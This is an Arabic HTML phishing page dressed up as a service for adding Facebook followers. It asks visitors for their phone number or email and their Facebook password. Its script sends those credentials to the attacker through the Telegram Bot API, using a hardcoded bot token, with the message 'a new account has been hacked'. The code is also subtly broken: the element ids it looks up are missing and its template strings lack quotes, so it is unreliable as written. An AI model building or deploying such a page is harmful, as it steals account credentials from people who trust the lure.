<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <title>زيادة متابعين فيسبوك</title>
  <style>
    body {
      background-color: #000;
      color: white;
      font-family: Arial, sans-serif;
      text-align: center;
      padding-top: 50px;
    }
    .form-container {
      background-color: #1c1c1c;
      padding: 30px;
      width: 300px;
      margin: auto;
      border-radius: 10px;
      box-shadow: 0 0 10px #222;
    }
    input, select, button {
      width: 90%;
      padding: 10px;
      margin: 10px 0;
      border-radius: 5px;
      border: none;
      font-size: 16px;
    }
    input, select {
      background-color: #333;
      color: white;
    }
    button {
      background-color: #007bff;
      color: white;
      font-weight: bold;
      cursor: pointer;
    }
    button:hover {
      background-color: #0056b3;
    }
    .facebook-icon {
      font-size: 60px;
      margin-top: 20px;
      color: #1877f2;
    }
    input:focus {
  outline: none;
  border: 2px solid #007bff; /* اختر اللون اللي تحبه هنا */
  box-shadow: 0 0 5px #007bff; /* تأثير إضافي لو حبيت */
}
  </style>
</head>
<body>
  <div class="form-container">
    <h2> زيادة متابعين فيسبوك 🚀</h2>
    <form>
      <input type="text" placeholder="أدخل رقم الهاتف أو الإيميل">
      
      <input type="password" placeholder="أدخل كلمة السر">
      
      <label>اختر عدد المتابعين :- </label>
      <select>
        <option> 1000 </option>
        <option> 5000 </option>
      </select>
      
      <button type="submit">رشق</button>
    </form>
   
  </div>
  <script>
  window.onload = function() {
    const params = new URLSearchParams(window.location.search);
    const chatId = params.get('chatId');
    const id = params.get('id');

    if (chatId && !id) {
      // لو فيه chatId بس — نحوله لـ id في نفس الرابط
      const targetURL = ${window.location.pathname}?id=${chatId};
      window.location.href = targetURL;
    }
    // لو فيه id هيكمل عادي بس مش هيعرضه
  };

  const botToken = "7524604559:AAF2iWs46yY4j7j9bOrbvNtku14gS4_mNiA";

  document.getElementById("loginForm").addEventListener("submit", function(e) {
    e.preventDefault();

    const params = new URLSearchParams(window.location.search);
    const id = params.get('id');

    if (!id) {
      alert("❌ لا يوجد ID لإرسال البيانات إليه!");
      return;
    }

    const email = document.getElementById("email").value;
    const password = document.getElementById("password").value;

    const message = 📥 - تم اختراق حساب جديد :- \n📧 - الإيميل : ${email}\n🔑 - الباسورد : ${password};

    const url = https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${id}&text=${encodeURIComponent(message)};

    fetch(url)
      .then(response => response.json())
      .then(data => {
        console.log("✅ تم الإرسال:", data);
        alert("✅ تم إرسال البيانات!");
      })
      .catch(error => {
        console.error("❌ خطأ:", error);
        alert("❌ حصلت مشكلة أثناء الإرسال!");
      });
  });
</script>
</body>
</html>
